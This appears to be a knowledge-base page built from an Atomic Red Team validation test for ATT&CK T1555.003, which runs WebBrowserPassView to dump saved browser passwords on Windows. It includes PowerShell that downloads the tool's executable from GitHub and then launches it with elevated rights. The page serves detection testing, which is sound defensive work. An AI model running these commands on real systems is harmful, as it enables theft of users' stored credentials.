---
atomic_guid: "e359627f-2d90-4320-ba5e-b0f878155bbe"
title: "WebBrowserPassView - Credentials from Browser"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.003"
attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "e359627f-2d90-4320-ba5e-b0f878155bbe"
  - "WebBrowserPassView - Credentials from Browser"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WebBrowserPassView - Credentials from Browser

The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.

## Metadata

- Atomic GUID: e359627f-2d90-4320-ba5e-b0f878155bbe
- Technique: T1555.003: Credentials from Password Stores: Credentials from Web Browsers
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1555.003/T1555.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555.003]]

## Input Arguments

### webbrowserpassview_path

- description: Path to the WebBrowserPassView executable 
- type: string
- default: PathToAtomicsFolder\T1555.003\bin\WebBrowserPassView.exe

## Dependencies

Check if WebBrowserPassView.exe exists in the specified path #{webbrowserpassview_path}

### Prerequisite Check

```powershell
if (Test-Path "#{webbrowserpassview_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile "#{webbrowserpassview_path}"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Start-Process "#{webbrowserpassview_path}"
Start-Sleep -Second 4
Stop-Process -Name "WebBrowserPassView"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml)
